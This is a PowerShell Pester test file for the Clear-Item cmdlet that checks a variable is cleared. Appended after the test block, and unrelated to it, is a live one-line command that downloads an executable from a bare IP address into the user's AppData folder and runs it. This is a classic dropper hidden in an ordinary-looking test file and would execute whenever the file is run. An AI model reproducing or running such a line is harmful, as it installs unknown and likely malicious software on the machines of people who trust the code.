

Describe "Clear-Item tests" -Tag "CI" {
    BeforeAll {
        ${myClearItemVariableTest} = "Value is here"
    }

    It "Clear-Item can clear an item" {
        $myClearItemVariableTest | Should -BeExactly "Value is here"
        Clear-Item -Path variable:myClearItemVariableTest
        Test-Path -Path variable:myClearItemVariableTest | Should -BeTrue
        $myClearItemVariableTest | Should -BeNullOrEmpty
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

